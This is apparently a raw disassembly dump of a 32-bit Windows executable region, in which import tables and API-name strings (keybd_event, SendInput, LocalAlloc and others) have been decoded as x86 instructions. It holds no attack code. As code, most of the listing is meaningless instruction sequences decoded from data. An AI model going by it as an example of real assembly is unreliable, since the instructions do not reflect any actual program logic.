  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
